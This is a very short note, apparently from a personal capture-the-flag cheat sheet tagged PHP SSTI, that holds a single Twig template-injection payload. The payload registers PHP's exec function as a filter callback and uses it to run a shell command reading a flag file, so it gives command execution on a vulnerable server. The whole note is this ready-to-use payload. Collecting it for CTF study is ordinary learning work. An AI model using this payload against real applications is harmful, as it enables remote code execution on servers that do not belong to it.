tags:: [[CTF/PHP/SSTI]]

- ```
  {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
  ```